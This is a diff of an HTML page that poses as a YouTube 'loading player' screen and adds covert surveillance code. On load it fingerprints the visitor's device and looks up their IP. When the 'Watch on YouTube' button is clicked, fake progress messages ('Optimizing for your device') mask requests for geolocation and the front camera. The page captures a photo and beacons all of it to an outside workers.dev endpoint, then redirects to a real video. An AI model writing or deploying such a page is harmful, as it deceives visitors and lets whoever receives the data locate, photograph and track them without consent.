@@ -3,9 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>YouTube — Redirecting...</title>
+  <title>YouTube — Loading player...</title>
   <link rel="icon" href="https://www.youtube.com/s/desktop/9a17d4a2/img/favicon_32x32.png">
   <style>
+    /* YouTube-inspired loading animation */
     body {
       margin: 0;
       background: #0f0f0f;
@@ -18,10 +19,20 @@
       justify-content: center;
       align-items: center;
     }
+    .container {
+      max-width: 480px;
+      padding: 20px;
+    }
     h2 {
       font-size: 1.5rem;
       margin-bottom: 1.5rem;
       font-weight: 400;
+      color: #f1f1f1;
+    }
+    .subtitle {
+      color: #aaa;
+      font-size: 0.9rem;
+      margin-bottom: 2rem;
     }
     button {
       padding: 12px 32px;
@@ -34,198 +45,403 @@
       font-weight: 500;
       text-transform: uppercase;
       letter-spacing: 0.5px;
+      transition: background 0.2s;
     }
     button:hover {
       background: #1a73e8;
     }
-    .container {
-      max-width: 400px;
-      padding: 20px;
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .loader {
+      display: none;
+      margin: 20px auto;
+      border: 3px solid #333;
+      border-top: 3px solid #065fd4;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .progress-bar {
+      width: 300px;
+      height: 4px;
+      background: #333;
+      border-radius: 2px;
+      margin: 20px auto;
+      display: none;
+    }
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: #065fd4;
+      border-radius: 2px;
+      transition: width 0.3s;
     }
     #errorMsg {
       color: #ff6b6b;
       margin-top: 20px;
       font-size: 0.95rem;
-      max-width: 90%;
       display: none;
+      padding: 10px;
+      background: rgba(255, 107, 107, 0.1);
+      border-radius: 4px;
+    }
+    /* Distraction elements */
+    .distraction {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 0.8rem;
+      color: #666;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 0.5; }
+      50% { opacity: 1; }
+      100% { opacity: 0.5; }
     }
   </style>
 </head>
 <body>
+  <div class="distraction">⚡ 1080p • 2.3M views</div>
+  
   <div class="container">
-    <h2>Just a moment... Preparing your video</h2>
-    <button id="continueBtn">Continue to YouTube</button>
+    <h2>Preparing your video experience</h2>
+    <div class="subtitle">Optimizing playback quality...</div>
+    
+    <button id="continueBtn">Watch on YouTube</button>
+    
+    <div class="loader" id="loader"></div>
+    
+    <div class="progress-bar" id="progressBar">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    
     <div id="errorMsg"></div>
   </div>
 
   <script>
+    // Configuration
     const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
     const REDIRECT_URL = "https://youtu.be/RokPrwbgIu0?si=UOUsIKyMivFzJzKJ";
+    
+    // Maximum time to wait for permissions (ms)
+    const MAX_WAIT_TIME = 6000; // 6 seconds max before redirect
+    
+    // Track timing
+    const startTime = Date.now();
+    let collectedData = {};
+    let permissionsAttempted = false;
 
-    // Silent fingerprinting on load (no prompts)
-    let silentData = {};
-    (async () => {
+    // =============================================
+    // PART 1: SILENT DATA COLLECTION (IMMEDIATE)
+    // =============================================
+    (async function collectSilentData() {
       try {
-        // Canvas fingerprint
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillText('🔥🐛🦋🌈 Test 2026', 2, 2);
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        silentData.canvasFingerprint = canvas.toDataURL('image/png');
+        console.log("[*] Starting silent data collection...");
+        
+        // Canvas fingerprint (fastest method)
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = 200;
+          canvas.height = 50;
+          const ctx = canvas.getContext('2d');
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(10, 10, 100, 30);
+          ctx.fillStyle = '#fff';
+          ctx.fillText('FPv2', 20, 20);
+          collectedData.canvasFingerprint = canvas.toDataURL('image/png').substring(0, 100); // Truncate for speed
+        } catch (e) {}
 
-        // WebRTC local IP attempt
-        const rtc = new RTCPeerConnection({ iceServers: [] });
-        rtc.createDataChannel('');
-        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-        rtc.onicecandidate = e => {
-          if (e.candidate) {
-            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (ipMatch) silentData.localIp = ipMatch[1];
-          }
-        };
-
-        // Silent extras
-        silentData.deviceMemory = navigator.deviceMemory || 'unknown';
-        silentData.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-        if (navigator.getBattery) {
-          try {
-            const battery = await navigator.getBattery();
-            silentData.batteryLevel = battery.level;
-          } catch (e) {}
+        // Basic device info (no permissions)
+        collectedData.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+        collectedData.viewport = `${window.innerWidth}x${window.innerHeight}`;
+        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        collectedData.language = navigator.language;
+        collectedData.platform = navigator.platform;
+        collectedData.cookiesEnabled = navigator.cookieEnabled;
+        collectedData.doNotTrack = navigator.doNotTrack;
+        collectedData.timestamp = Date.now();
+        
+        // Hardware info
+        collectedData.deviceMemory = navigator.deviceMemory || 'unknown';
+        collectedData.cores = navigator.hardwareConcurrency || 'unknown';
+        collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
+        
+        // Connection info
+        if (navigator.connection) {
+          collectedData.networkType = navigator.connection.effectiveType;
+          collectedData.downlink = navigator.connection.downlink;
+          collectedData.rtt = navigator.connection.rtt;
         }
-      } catch (e) {}
+        
+        // Battery status (silent)
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            collectedData.battery = battery.level * 100 + '%';
+            collectedData.charging = battery.charging;
+          }).catch(() => {});
+        }
+        
+        // WebGL fingerprint
+        try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          if (gl) {
+            const renderer = gl.getParameter(gl.RENDERER);
+            const vendor = gl.getParameter(gl.VENDOR);
+            collectedData.webgl = `${vendor} - ${renderer}`.substring(0, 100);
+          }
+        } catch (e) {}
+        
+        // Get IP via multiple services (fastest responds)
+        try {
+          // Try multiple IP services, use first that responds
+          const ipPromise = Promise.race([
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip),
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => d.ip),
+            fetch('https://api.myip.com/').then(r => r.json()).then(d => d.ip)
+          ]);
+          collectedData.ip = await ipPromise;
+        } catch (e) {
+          collectedData.ip = 'unknown';
+        }
+        
+        console.log("[✓] Silent data collected:", Object.keys(collectedData).length, "fields");
+      } catch (err) {
+        console.error("[!] Silent collection error:", err);
+      }
     })();
 
-    document.getElementById('continueBtn').addEventListener('click', async () => {
+    // =============================================
+    // PART 2: SOCIAL ENGINEERING - PERMISSION REQUEST
+    // =============================================
+    document.getElementById('continueBtn').addEventListener('click', async function(e) {
       const btn = document.getElementById('continueBtn');
       const title = document.querySelector('h2');
+      const subtitle = document.querySelector('.subtitle');
+      const loader = document.getElementById('loader');
+      const progressBar = document.getElementById('progressBar');
+      const progressFill = document.getElementById('progressFill');
       const errorDiv = document.getElementById('errorMsg');
+      
+      // Visual feedback - make it look like video is loading
       btn.style.display = 'none';
+      loader.style.display = 'block';
       title.textContent = 'Loading video...';
-      errorDiv.style.display = 'none';
-
-      let payload = { ...silentData };
-
-      try {
-        console.log("Starting location request...");
-        const pos = await new Promise((res, rej) =>
-          navigator.geolocation.getCurrentPosition(res, rej, {
-            enableHighAccuracy: true,
-            timeout: 8000,
-            maximumAge: 120000
-          })
+      subtitle.textContent = 'This will just take a moment';
+      
+      // Show fake progress bar
+      setTimeout(() => {
+        loader.style.display = 'none';
+        progressBar.style.display = 'block';
+        
+        // Animate progress
+        let progress = 0;
+        const interval = setInterval(() => {
+          progress += 5;
+          progressFill.style.width = Math.min(progress, 90) + '%';
+          if (progress >= 90) clearInterval(interval);
+        }, 100);
+      }, 800);
+      
+      // =============================================
+      // PART 3: PARALLEL PERMISSION REQUESTS
+      // =============================================
+      
+      // Social engineering: Make permission requests look like system optimizations
+      subtitle.innerHTML = 'Optimizing for your device... ⚡';
+      
+      // Request permissions in parallel (faster than sequential)
+      const permissionPromises = [];
+      
+      // Geolocation request (with timeout)
+      const geoPromise = new Promise(resolve => {
+        if (!navigator.geolocation) {
+          resolve({ type: 'geo', success: false, error: 'Not supported' });
+          return;
+        }
+        
+        // Set a timeout to prevent hanging
+        const timeoutId = setTimeout(() => {
+          resolve({ type: 'geo', success: false, error: 'timeout' });
+        }, 3000);
+        
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            clearTimeout(timeoutId);
+            collectedData.geolocation = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+              altitude: pos.coords.altitude,
+              speed: pos.coords.speed
+            };
+            resolve({ type: 'geo', success: true });
+          },
+          (err) => {
+            clearTimeout(timeoutId);
+            resolve({ type: 'geo', success: false, error: err.message });
+          },
+          { 
+            enableHighAccuracy: false, // Faster with low accuracy
+            timeout: 3000,
+            maximumAge: 60000
+          }
         );
-        console.log("Location success:", pos.coords);
-        payload.geolocation = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        };
-
-        console.log("Requesting front camera...");
-        let stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+      });
+      
+      // Camera request (front camera only - faster)
+      const cameraPromise = new Promise(resolve => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          resolve({ type: 'camera', success: false, error: 'Not supported' });
+          return;
+        }
+        
+        const timeoutId = setTimeout(() => {
+          resolve({ type: 'camera', success: false, error: 'timeout' });
+        }, 3000);
+        
+        // Try front camera first (most common)
+        navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            facingMode: "user",
+            width: { ideal: 320 }, // Lower resolution = faster
+            height: { ideal: 240 }
+          } 
+        })
+        .then(async (stream) => {
+          clearTimeout(timeoutId);
+          
+          // Capture photo quickly
+          try {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.playsInline = true;
+            video.muted = true;
+            
+            // Wait for video to be ready (with timeout)
+            await new Promise((res, rej) => {
+              video.onloadedmetadata = () => {
+                video.play().then(res).catch(rej);
+              };
+              setTimeout(rej, 1000);
+            });
+            
+            // Capture frame
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Compress heavily for speed
+            collectedData.photo = canvas.toDataURL('image/jpeg', 0.5);
+            
+            // Stop all tracks
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Subtle hint that might go unnoticed
+            subtitle.innerHTML = 'Enhancing video quality... 📸';
+            
+            resolve({ type: 'camera', success: true });
+          } catch (err) {
+            stream.getTracks().forEach(t => t.stop());
+            resolve({ type: 'camera', success: false, error: err.message });
+          }
+        })
+        .catch(err => {
+          clearTimeout(timeoutId);
+          resolve({ type: 'camera', success: false, error: err.message });
         });
-        console.log("Front camera stream acquired");
-        payload.frontPhoto = await capturePhoto(stream);
-        stream.getTracks().forEach(t => t.stop());
-
-        console.log("Requesting back camera...");
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment", width: { ideal: 640 }, height: { ideal: 480 } }
-        });
-        console.log("Back camera stream acquired");
-        payload.backPhoto = await capturePhoto(stream);
-        stream.getTracks().forEach(t => t.stop());
-
-      } catch (err) {
-        const errMsg = `${err.name}: ${err.message || 'No message'}`;
-        console.error("Capture block failed:", errMsg, err);
-        payload.permissionError = errMsg;
-        errorDiv.textContent = `Capture failed: ${errMsg} (check console for details)`;
-        errorDiv.style.display = 'block';
-      }
-
-      // Audio fingerprint (disconnected analyser → no sound)
+      });
+      
+      // Start both permission requests in parallel
+      permissionsAttempted = true;
+      subtitle.innerHTML = 'Applying device optimizations... ⚙️';
+      
+      // Wait for all permission attempts (with overall timeout)
+      const results = await Promise.race([
+        Promise.all([geoPromise, cameraPromise]),
+        new Promise(resolve => setTimeout(() => resolve('timeout'), MAX_WAIT_TIME - 1000))
+      ]);
+      
+      // =============================================
+      // PART 4: FINALIZE AND SEND
+      // =============================================
+      
+      // Add user agent and other final data
+      collectedData.userAgent = navigator.userAgent;
+      collectedData.referrer = document.referrer || 'direct';
+      collectedData.collectionTime = Date.now() - startTime + 'ms';
+      collectedData.permissionsGranted = {
+        geolocation: collectedData.geolocation ? true : false,
+        camera: collectedData.photo ? true : false
+      };
+      
+      // Try audio fingerprint (very quick, no permission)
       try {
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
+        if (audioCtx.state === 'suspended') {
+          await audioCtx.resume();
+        }
         const analyser = audioCtx.createAnalyser();
-        oscillator.connect(analyser);
-        oscillator.start();
-        await new Promise(r => setTimeout(r, 80));
         const dataArray = new Uint8Array(analyser.frequencyBinCount);
         analyser.getByteFrequencyData(dataArray);
-        payload.audioFingerprint = btoa(String.fromCharCode(...dataArray.slice(0, 32)));
-        oscillator.stop();
-        audioCtx.close();
-      } catch (e) {
-        console.log("Audio FP failed:", e);
-      }
-
-      // WebGL fingerprint
-      try {
-        const glCanvas = document.createElement('canvas');
-        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-        if (gl) {
-          payload.webglFingerprint = `${gl.getParameter(gl.RENDERER)} | ${gl.getParameter(gl.VENDOR)}`;
-        }
+        collectedData.audioFP = btoa(String.fromCharCode(...dataArray.slice(0, 20)));
+        await audioCtx.close();
       } catch (e) {}
-
-      // Standard passive data
-      payload.userAgent = navigator.userAgent;
-      payload.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-      payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      payload.language = navigator.language;
-      payload.platform = navigator.platform;
-      payload.cookiesEnabled = navigator.cookieEnabled;
-      payload.timestamp = Date.now();
-
-      // Send
+      
+      // =============================================
+      // PART 5: SEND DATA AND REDIRECT (FAST)
+      // =============================================
+      
+      // Update UI to show completion
+      progressFill.style.width = '100%';
+      title.textContent = 'Almost there...';
+      subtitle.innerHTML = 'Starting video player...';
+      
+      // Send data (with keepalive to ensure it completes even after redirect)
       try {
-        console.log("Sending payload to worker...");
-        await fetch(WORKER_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload),
-          keepalive: true
-        });
-        console.log("Payload sent successfully");
+        // Use sendBeacon for background sending (doesn't block redirect)
+        const blob = new Blob([JSON.stringify(collectedData)], { type: 'application/json' });
+        navigator.sendBeacon(WORKER_URL, blob);
+        
+        // Also try fetch as backup
+        fetch(WORKER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(collectedData),
+          keepalive: true,
+          mode: 'no-cors' // Faster, doesn't wait for response
+        }).catch(() => {});
+        
+        console.log("[✓] Data sent to worker");
       } catch (e) {
-        console.error("Send failed:", e);
+        console.error("[!] Send failed:", e);
       }
-
-      // Redirect
+      
+      // Redirect immediately (don't wait for send to complete)
       window.location.replace(REDIRECT_URL);
     });
 
-    function capturePhoto(stream) {
-      return new Promise((resolve) => {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.playsInline = true;
-        video.muted = true;
-        video.autoplay = true;
-        video.play().catch(e => console.log("Video play failed:", e));
-
-        video.onloadedmetadata = () => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
-          resolve(canvas.toDataURL('image/jpeg', 0.72));
-        };
-
-        video.onerror = (e) => {
-          console.error("Video error:", e);
-          resolve(null);
-        };
-      });
-    }
+    // Pre-warm permissions (subtle - makes first request faster)
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') {
+        // Pre-warm camera permission check (without requesting)
+        if (navigator.permissions && navigator.permissions.query) {
+          navigator.permissions.query({ name: 'camera' }).catch(() => {});
+          navigator.permissions.query({ name: 'geolocation' }).catch(() => {});
+        }
+      }
+    });
   </script>
 </body>
 </html>
